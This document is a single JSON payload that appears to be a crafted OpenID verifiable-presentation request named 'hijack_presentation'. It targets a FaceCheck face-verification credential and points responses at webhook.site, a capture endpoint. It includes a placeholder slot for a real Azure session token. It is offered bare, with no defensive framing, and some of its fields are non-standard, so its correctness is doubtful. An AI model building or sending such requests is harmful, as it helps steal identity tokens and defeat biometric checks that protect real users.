{
  "client_id": "did:web:webhook.site",
  "response_type": "id_token",
  "response_mode": "post",
  "scope": "openid",
  "nonce": "random_nonce_123",
  "claims": {
    "vp_token": {
      "presentation_definition": {
        "id": "hijack_presentation",
        "input_descriptors": [
          {
            "id": "FaceCheck",
            "schema": [{"uri": "FaceCheckCredential"}],
            "constraints": {
               "fields": [{"path": ["$.vc.credentialSubject."], "faceSDK": true}]
            }
          }
        ],
        "facecheck_session_token": {
          "authToken": "YOUR_REAL_AZURE_TOKEN"
        }
      }
    }
  }
}
